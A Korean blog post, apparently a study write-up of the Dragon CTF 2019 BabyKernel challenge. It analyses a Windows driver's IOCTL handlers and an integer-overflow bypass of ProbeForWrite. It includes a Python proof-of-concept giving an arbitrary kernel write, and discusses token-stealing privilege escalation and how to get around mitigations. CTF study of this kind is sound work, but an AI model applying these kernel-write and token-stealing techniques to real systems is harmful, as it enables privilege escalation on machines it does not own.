---
layout: post
title: BabyKernel - Dragon CTF 2019
subtitle: BabyKernel prob solution
tags: [Linux, Kernel, CTF, pwn]
---

# Introduction

[[Writeup] BabyKernel - Dragon CTF 2019](https://null2root.github.io/blog/2020/01/11/BabyKernel-Dragon2019-writeup.html)

군대에서 인연으로 만난 null@root 에서 공부하는 y0ny0ns0n 님을 만나서 소개 받은 여러 글 중에 CTF 푸시면서 좀 이런 저런 문서를 많이 보시고 해당 문제를 추천받았다. 슥 훑어보고 나중에 따로 디버깅 해보려고 문서 보면서 좀 필요한 내용들 정리해볼 계획이다. 이 문제 이외에도 WCTF 2018 에 출제된 searchme 문제가 있는데 이것도 한번 풀어 볼 계획이고, 꽤 좋은 문서라서 따로 또 추천 받기도 했다.

# Debug Setting

환경은 다음과 같이 구성하였다.

- Windows 10 Version 1809 (OS Build 17763.914)
- VMware Workstation Pro 15.5.1

문제파일: [https://github.com/j00ru/ctf-tasks/tree/master/Dragon CTF 2019/Main event/BabyKernel/task](https://github.com/j00ru/ctf-tasks/tree/master/Dragon%20CTF%202019/Main%20event/BabyKernel/task)

# SecureClient Analysis

![https://null2root.github.io/assets/images/babykernel-pic2.png](https://null2root.github.io/assets/images/babykernel-pic2.png)

일단 문제를 보면 SecureClient.exe 파일이 주어지는데 이 파일로 sys 드라이버 파일과 통신하는거 같다. 여기서 좀 다른게 있다면 `protect` 를 입력시 메세지를 입력하라고 뜨고 해당 입력값을 요구하고 이를 입력하면 user-mode buffer is now empty 라는 문구를 출력한다.

게싱만 해보면 protect 명령어를 통해 user space 영역에 값을 넣는것 같고, 취약점이 발생한다면 size 문제 정도나 race condition 으로 영역 해제 관련 취약점이 있을꺼 같았다.

```cpp
sub_7FF7F67439D0(&qword_7FF7F67784C0, &user_msg, v13);
v15 = &user_msg;
if ( v39 >= 0x10 )
    v15 = user_msg;
sub_7FF7F674AC08(InBuffer, 4096i64, v15, 4096i64);
DeviceIoControl(hDriver, 0x226203u, 0i64, 0, 0i64, 0, &BytesReturned, 0i64);
InBufferLen = -1i64;
do
    ++InBufferLen;
while ( InBuffer[InBufferLen] );
if ( DeviceIoControl(hDriver, 0x22620Bu, InBuffer, InBufferLen, 0i64, 0, &BytesReturned, 0i64) )
{
    LODWORD(v17) = cpp_cout(Format, "[+] Successfully protected message, user-mode buffer is now empty");
```

해당 코드는 SecureClient.exe 의 일부 코드이다. 여기서 DeviceIoControl() 함수는 Buffered I/O 통신을 사용하는 커널 드라이버와 통신을 하기 위한 함수이다. IOCTL 로 Linux Kernel 에서 I/O 통신을 하는 꼴을 자주 봤었는데 아마 동일한 함수 라고 생각든다. 자세한건 MSDN 을 참고하자.

```cpp
BOOL DeviceIoControl(
    HANDLE       hDevice,
    DWORD        dwIoControlCode, // a.k.a IOCTL code
    LPVOID       lpInBuffer,
    DWORD        nInBufferSize,
    LPVOID       lpOutBuffer,
    DWORD        nOutBufferSize,
    LPDWORD      lpBytesReturned,
    LPOVERLAPPED lpOverlapped
);
```

다음과 같이 입력값 lpInBuffer 혹은 출력값 lpOutBuffer 를 인자값으로 지정할 수 있다.  위 코드에서는 `0x226203u` 와 `0x22620Bu` 를 사용해 IOCTL 통신을 한다.  `0x226203u` 는 입력값 혹은 입력값의 버퍼를 호출 하지 않지만, 반대로 `0x22620Bu` 는 사용자가 입력한 Inbuffer 를 입력값 버퍼로 지정해주는데, 호출 이후에 InBuffer 에 보관되어있던 메세지를  InBufferLen 만큼 NULL 로 덮어 써진다.

Unprotect 부분을 입력할 경우에 보호했던 메세지를 수신했다고 출력하는데, 이 부분은 중요 부분인 IOCTL 부분만 작성 하였다.

```cpp
DeviceIoControl(hDriver, 0x226207u, 0i64, 0, 0i64, 0, BytesReturned + 1, 0i64);
if ( !DeviceIoControl(hDriver, 0x22620Bu, InBuffer, 0x1000u, 0i64, 0, BytesReturned + 1, 0i64) )
{
    LODWORD(v26) = cpp_cout(Format, "[-] Unable to unprotect a message, aborting");
    // ....
}
LODWORD(v20) = cpp_cout(Format, "[+] Retrieved the following message: ");
LODWORD(v21) = cpp_cout(v20, InBuffer);
```

여기서도 2개의 IOCTL 이 사용되는데 각각 `0x226207u` 와 `0x22620Bu` 가 사용되는 것을 확인 할 수 있었다. `0x226207u` 는 따로 입 출력값 버퍼를 지정해주지 않고 사용하지만 `0x22620Bu` 에서 입력값 버퍼로 지정해 준 InBuffer 에 Unable to unprotect a message, aborting 메세지를 넣는다. 대충 보호되어 aborting 한다는 의미인데 체크하는거 같다.

이후 unprotect 를 입력해 다시 한번 위의 코드를 실행하면 아무런 메세지가 뜨지 않는데, Kernel Buffer 에 보관중이던 메세지도 IOCTL 통신 이후에 초기화 된 것으로 예상된다.

# SecureDrv Analysis

```cpp
NTSTATUS __fastcall sub_FFFFF8030740123C(PDRIVER_OBJECT DriverObject)
{
    PDRIVER_OBJECT v1; // rbx
    NTSTATUS result; // eax
    UNICODE_STRING DestinationString; // [rsp+40h] [rbp-28h]
    UNICODE_STRING SymbolicLinkName; // [rsp+50h] [rbp-18h]

    v1 = DriverObject;
    DbgPrint("[+] SecureDrv: driver loaded\r\n");
    RtlInitUnicodeString(&DestinationString, L"\\Device\\SecureStorage");
    RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\SecureStorage");
    result = IoCreateDevice(v1, 0, &DestinationString, 0x22u, 0x100u, 0, &DeviceObject);
    if ( result >= 0 )
    {
        IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
        memset64(v1->MajorFunction, just_return_STATUS_NOT_SUPPORTED, 0x1Bui64);
        v1->MajorFunction[14] = deviceControlHandler; // IRP_MJ_DEVICE_CONTROL
        v1->DriverUnload = driverUnloadHandler;
        qword_FFFFF80307403020 = 0i64;
        dword_FFFFF80307403028 = 0;
        FastMutex.Count = 1;
        KeInitializeEvent(&Event, SynchronizationEvent, 0);
        qword_FFFFF80307404050 = sub_FFFFF80307401130;
        DbgPrint("[+] SecureDrv: driver initialized\r\n");
        result = 0;
    }
    return result;
}
```

보통 window driver programming 을 하게되면 entrypoint인 DriverEntry() 함수를 사용하게 되는데 Base address 는 다르지만 loader 부분을 찾은거 같다. 보통 IOCTL 루틴을 찾아 case 문으로 넘버링 되어 있는데, 이러한 루틴은 [`IRP_MJ_DEVICE_CONTROL`](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control) 핸들러 함수안에 있기 때문에, 해당 핸들러 함수를 보면 IOCTL 구조처리 구문을 확인 할 수 있다.

```cpp
v6 = v2->UserBuffer;
// ....
case 0x226203u:
    v8 = user_to_kernel_handler;
    goto LABEL_9;
case 0x226207u:
    v8 = kernel_to_user_handler;
LABEL_9:
    func_ptr = v8;
    break;
case 0x22620Bu:
    v7 = just_jmp_to_func_ptr(func_ptr); // jmp rax(=func_ptr)
    if ( v6 )
    {
        ProbeForWrite(v6, 8ui64, 1u);
        *v6 = v7;
    }
    break;
```

여기서 가장 중요한 함수는 `0x226203u` (user_to_kernel_handler) 와 `0x226207u` (kernel_to_user_handler) 정도가 있다. 

```cpp
signed __int64 __fastcall user_to_kernel_handler(_BYTE *a1, unsigned int a2)
{
    _BYTE *user_msg; // rdi
    unsigned __int64 user_msg_len; // rsi

    user_msg = a1;
    if ( a2 > 0xFFF )                 // cmp     edx, 0FFFh
        return 0xFFFFFFFFC000000Di64; // STATUS_INVALID_PARAMETER
    user_msg_len = a2;
    ProbeForWrite(a1, a2, 1u);
    kmemcpy(kernel_msg, user_msg, user_msg_len);
    if ( user_msg_len >= 0x1000 )     // cmp     rsi, 1000h
        _report_rangecheckfailure();
    kernel_msg[user_msg_len] = 0;
    memset(user_msg, 0, user_msg_len);
    return 0i64;
}

__int64 __fastcall kernel_to_user_handler(_BYTE *a1, unsigned int a2)
{
    unsigned __int64 user_msg_len; // rbx
    _BYTE *user_msg; // r14
    unsigned __int64 kernel_msg_len; // rax

    user_msg_len = a2;
    user_msg = a1;
    ProbeForWrite(a1, a2 + 1, 1u); // lea     r8d, [rsi+1] and Check to User-land
																	 // a2 = 0xffffffff > a2 = 0
    kernel_msg_len = -1i64;
    do
      ++kernel_msg_len;
    while ( kernel_msg[kernel_msg_len] );
    if ( user_msg_len >= kernel_msg_len )
      user_msg_len = kernel_msg_len;
    memcpy(user_msg, kernel_msg, user_msg_len);
    user_msg[user_msg_len] = 0;
    memset(kernel_msg, 0, user_msg_len);
    return 0i64;
}
```

위 코드를 보면 `user_to_kernel_handler()` 함수는 입력값 버퍼를 메세지를 읽고 커널 메모리 영역에 삽입하는데, `kernel_to_user_handler()` 함수의 경우, 커널 메모리 영역에 보관된 메세지를 읽어드려 **입력값 버퍼에 삽입**한다.

이때 입력값 버퍼는 DeviceIoControl() 함수의 3번째 인자값이기 때문에 주소값을 원하는 대로 조작할 수 있다. 하지만 memcpy() 수행 전에 [ProbeForWrite()](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-probeforwrite) 함수로 입력값 버퍼의 주소가 실제 User-land 에 속하는 주소인지 검사를 실시하게 된다.

이 검사는 kernel_to_user_handler() 함수에서 ProbeForWrite() 함수의 2번째 인자값에 1을 더해 호출되기 때문에, 하단의 코드처럼 입력값 버퍼의 크기를 0xFFFFFFFF 로 지정해주면 Integer Overflow 가 발생해 우회가 가능하다.

# POC

```python
from KePwnLib import *
import sys

BABY_IOCTL_CODE1 = 0x226203 # user -> kernel
BABY_IOCTL_CODE2 = 0x226207 # kernel -> user
BABY_IOCTL_CODE3 = 0x22620B # jmp to handler

DRIVER_NAME = "\\\\.\\SecureStorage"
DEVICE_NAME = "SecureDrv"

# edit for exploit
DeviceIoControl.argtypes = [
	HANDLE,
	DWORD,
	c_ulonglong, # LPVOID,
	DWORD,
	LPVOID,
	DWORD,
	POINTER(DWORD),
	LPVOID
]

hDriver = DriverConnect(DRIVER_NAME)
if hDriver == NULL:
	print "[!] cannot create kernel driver handler"
	sys.exit(-1)

print "[+] %s handler      = 0x%x" % (DRIVER_NAME, hDriver)
securedrv_addr = GetDeviceBase(DEVICE_NAME)
print "[+] %s base address = 0x%016x" % (DEVICE_NAME, securedrv_addr)

dwRet = DWORD(0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE1, NULL, 0, NULL, 0, byref(dwRet), 0)

buf = create_string_buffer(0x100)
memmove(buf, "A" * 8, 8)
DeviceIoControl(hDriver, BABY_IOCTL_CODE3, addressof(buf), 8, NULL, 0, byref(dwRet), 0)

DeviceIoControl(hDriver, BABY_IOCTL_CODE2, NULL, 0, NULL, 0, byref(dwRet), 0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE3, securedrv_addr+0x4050, -1, NULL, 0, byref(dwRet), 0)

'''
SecureDrv+0x11e3:
fffff803`074311e3 ff153f0e0000    call    qword ptr [SecureDrv+0x2028 (fffff803`07432028)]
0: kd> r rcx,rdx,r8
rcx=fffff80307434050 rdx=0000000000000000 r8=0000000000000001
0: kd> dqs fffff803`07432028 l1
fffff803`07432028  fffff803`06868db0 nt!ProbeForWrite
....
SecureDrv+0x120d:
fffff803`0743120d e8ae010000      call    SecureDrv+0x13c0 (fffff803`074313c0) <- memcpy()
1: kd> r rcx,rdx,r8
rcx=fffff80307434050 rdx=fffff80307433050 r8=0000000000000008
1: kd> dqs @rdx l1
fffff803`07433050  41414141`41414141
'''
```

Kernel_to_user_handler() 에서 user_msg_len 의 값이 0xFFFFFFFF 가 되기 때문에 항상 Kernel_msg_len 의 값이 memcpy() 함수의 3번째 인자로 사용된다. Kernel_msg_len 은 kernel_msg 에 보관된 값이 문자열이라고 가정한 상태에서 길이를 계산하기 때문에, 임의의 주소에 쓰고자 하는 값 중간에 NULL 바이트가 들어가지 않도록 유의해야한다.

추가적으로 poc 코드는 원문 코드로 작성했는데 KePwnLib 의 파일 좀 보고 호출하는거 흐름만 파악하고 하면 될꺼같다. 어짜피 아직 DeviceIOControl 위주로 poc 짠거라 상관은 크게 상관 없을꺼 같다.

# Exploit

취약점 자체는 간단하다. 하지만 Linux kernel 도 그랬다. 문제 자체의 취약점은 간단한데 익스가 좀 귀찮다. 일단 문서에서 소개한 Window 10 의 Mitigation 몇가지를 소개 받아봤다.

- [0x0 주소 mapping](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/b91c324/Exploit/Common.c#L263-L302) 불가

    ![https://null2root.github.io/assets/images/babykernel-pic3.png](https://null2root.github.io/assets/images/babykernel-pic3.png)

- [SMEP](https://en.wikipedia.org/wiki/Control_register#SMEP)로 인해 Kernel-Land( Ring-0 )에서 User-Land( Ring-3 )의 코드를 실행할 수 없음
- [NtQueryIntervalProfile()](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProfile%2FNtQueryIntervalProfile.html)에서 `HalDispatchTable`에 보관된 주소값을 참조해 호출하는 부분에 [Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)가 추가됨

    ```
    0: kd> u nt!KeQueryIntervalProfile l10
    nt!KeQueryIntervalProfile:
    fffff803`068d3b74 4883ec58 sub rsp,58h
    fffff803`068d3b78 83f901 cmp ecx,1
    fffff803`068d3b7b 7436 je nt!KeQueryIntervalProfile+0x3f (fffff803`068d3bb3)
    fffff803`068d3b7d 488b0504e4d3ff mov rax,qword ptr [nt!HalDispatchTable+0x8 (fffff803`06611f88)]
    fffff803`068d3b84 4c8d4c2460 lea r9,[rsp+60h]
    fffff803`068d3b89 ba18000000 mov edx,18h
    fffff803`068d3b8e 894c2430 mov dword ptr [rsp+30h],ecx
    fffff803`068d3b92 4c8d442430 lea r8,[rsp+30h]
    fffff803`068d3b97 8d4ae9 lea ecx,[rdx-17h]
    fffff803`068d3b9a e8e1e5afff call nt!guard_dispatch_icall (fffff803`063d2180)
    ....
    ```

- Integrity level이 low인 프로세스는 NtQuerySystemInformation(), EnumDeviceDrivers()와 같은 KASLR Bypass에 사용될 수 있는 함수들을 호출할 수 없음

    [KASLR Bypass Mitigations in Windows 8.1](https://www.notion.so/b4sh5i/KASLR-Bypass-Mitigations-in-Windows-8-1-54ed5e0f1e8b4ab9bca5a8b34f9ea2d4)

이거 이외에도 여러가지가 있을꺼 같은데 이것들만 집고 가자.

보통 Windows Kernel Exploit 에는 pid 가 항상 4 로 고정되어 있는 SYSTEM 프로세스의 Token 을 훔쳐오는 쉘코드를 실행하는 형태로 이루어진다.

[A Primer to Windows x64 shellcoding](https://www.notion.so/b4sh5i/A-Primer-to-Windows-x64-shellcoding-fb8afb4c19b6494c80700699825b62b1)

Token 이란 현 프로세스 혹은 쓰레드의 권한을 정하는 객체를 의미하는데 이를 MSDN 에선 Access Tokens 라고 한다. Windows에 상에서 동작하는 모든 프로세스들은 _EPROCESS 객체의 double linked list 형태로 관리되며 Token 역시 이 객체안에 보관된다. Windows 커널 익스플로잇을 위한 쉘코드는 이 _EPROCESS 객체의 double linked list를 순회하며 SYSTEM 프로세스를 찾는 방식으로 동작한다.

문서에서 보니 [KePwnLib.py](http://kepwnlib.py) 에 `tokenStealingShellcodeForWin10_1809` 란 이름으로 정의해둔 쉘코드를 사용했는데, 중간에 NULL가 들어가지 않도록 간단한 XOR encoder를 가지고 아래와 같은 익스플로잇 코드를 작성했다고 한다. 

마지막으로 NonPagedPool 객체 영역은 실행권한이 없다고 알고 있었는데 ExAllocatePoolWithTag(NonPagedPool, 0x1000)으로 할당한 영역에 RWX 권한이 있었다는 코멘트를남기고 풀 익스 코드를 작성하였다.

# Conclusion

일단 아직 익스는 못했는데 어느정도 bypass 할 부분이 먼지 좀 감이 잡히긴 했는데 그 Token 개념이 Linux Kernel 에서 prepare_kernel_cred(0) 처럼 0 으로 만들어 root 권한 가져오는거랑 비슷한 느낌인지 아직은 잘 가늠이 안가는데, 생각해보니 SYSTEM 권한의 프로세스를 찾아서 해당영역에 AWW 취약점 써서 값 쓰면 되는거기 때문이니깐 크게 신경 안써도 될꺼 같다.
